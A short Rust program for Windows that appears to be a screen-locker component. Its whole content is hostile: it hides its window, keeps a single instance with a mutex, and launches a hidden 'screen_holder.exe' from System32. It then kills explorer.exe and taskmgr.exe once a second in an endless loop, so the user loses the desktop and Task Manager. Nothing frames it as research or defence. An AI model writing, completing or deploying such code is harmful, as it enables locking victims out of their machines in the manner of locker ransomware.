#![windows_subsystem = "windows"]
use std::process::Command;
use std::thread;
use std::time::Duration;
use std::os::windows::process::CommandExt;
use winapi::um::synchapi::CreateMutexW;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::winbase::ERROR_ALREADY_EXISTS;
use std::ptr::null_mut;

const CREATE_NO_WINDOW: u32 = 0x08000000;

fn main() {
    unsafe {
        let mutex_name: Vec<u16> = "GATE_LOCK_MUTEX\0".encode_utf16().collect();
        let m = CreateMutexW(null_mut(), 1, mutex_name.as_ptr());
        if GetLastError() == ERROR_ALREADY_EXISTS {
            return;
        }
        if m.is_null() {
            return;
        }
    }

    let sys = std::env::var("SYSTEMROOT").unwrap() + "\\System32";
    let screen_path = format!("{}\\screen_holder.exe", sys);

    let _ = Command::new(&screen_path)
        .creation_flags(CREATE_NO_WINDOW)
        .spawn();

    let _ = Command::new("taskkill")
        .args(["/f", "/im", "explorer.exe"])
        .status();

    loop {
        thread::sleep(Duration::from_secs(1));
        let _ = Command::new("taskkill")
            .args(["/f", "/im", "explorer.exe"])
            .status();
        let _ = Command::new("taskkill")
            .args(["/f", "/im", "taskmgr.exe"])
            .status();
        let _ = Command::new(&screen_path)
            .creation_flags(CREATE_NO_WINDOW)
            .spawn();
    }
}
